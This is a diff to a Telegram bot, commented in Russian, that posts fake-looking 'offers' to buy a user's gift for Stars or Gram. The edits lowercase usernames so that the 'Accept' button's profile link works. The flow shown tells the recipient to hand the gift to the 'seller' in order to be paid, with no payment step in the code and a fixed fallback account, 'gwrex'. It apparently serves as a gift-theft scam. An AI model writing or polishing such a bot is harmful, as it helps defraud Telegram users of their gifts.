@@ -90,8 +90,8 @@ export default {
         if (iq.from.last_name) senderName += " " + iq.from.last_name;
         if (!senderName) senderName = iq.from.username ? "@" + iq.from.username : "Игрок";
 
-        // БЕРЕМ НИК ПРОДАВЦА. Если ника нет - используем gwrex (чтобы кнопка работала)
-        const sellerUsername = iq.from.username || "gwrex";
+        // ИСПРАВЛЕНИЕ: Приводим ник к нижнему регистру для корректной ссылки!
+        const sellerUsername = iq.from.username ? iq.from.username.toLowerCase() : "gwrex";
         
         const text = `🎁 <b>Оффер на подарок</b>\n\n👤 <b>${senderName}</b> предлагает вам ${amount} ${currencyDisplay} за этот подарок.\n\n${giftLink}\n\n⏳ Предложение действительно 5 ч. 59 мин.`;
 
@@ -103,7 +103,7 @@ export default {
           input_message_content: { message_text: text, parse_mode: "HTML" },
           reply_markup: {
             inline_keyboard: [
-              // В кнопку зашиваем НИК продавца (безопасно для Telegram)
+              // Зашиваем ник в нижнем регистре
               [{ text: "✅ Принять", callback_data: `acc|${amount}|${currencyType}|${sellerUsername}` }],
               [{ text: "❌ Отклонить", callback_data: `dec|${amount}|${currencyType}` }]
             ]
@@ -155,15 +155,15 @@ export default {
           const action = dataParts[0];
           const amount = dataParts[1] || "0";
           const currencyType = dataParts[2] || "stars";
-          const sellerUsername = dataParts[3] || "gwrex"; // Ник продавца
+          const sellerUsername = dataParts[3] || "gwrex"; 
           const displayCurrency = currencyType === "gram" ? "💎 Gram" : "⭐ Stars";
 
           const buyer = cq.from;
           let buyerName = buyer.first_name || "";
           if (buyer.last_name) buyerName += " " + buyer.last_name;
 
-          // ССЫЛКА НА ПРОФИЛЬ ПРОДАВЦА (ВСЕГДА HTTPS!)
-          const sellerLink = "https://t.me/" + sellerUsername;
+          // Теперь ссылка ВСЕГДА будет маленькими буквами (например, https://t.me/gwrex)
+          const sellerLink = "https://t.me/" + sellerUsername.toLowerCase();
 
           let newText = "";
           let newMarkup = { inline_keyboard: [] };
@@ -177,7 +177,6 @@ export default {
             
             newText = `✅ <b>Оффер принят!</b>\n\nПокупатель: <b>${buyerName}</b>\n\nЧтобы получить ${amount} ${displayCurrency}, передайте подарок продавцу.`;
             newMarkup = { 
-              // Кнопка ведет на профиль ПРОДАВЦА
               inline_keyboard: [[{ text: "🎁 Передать подарок", url: sellerLink }]] 
             };
           } else {
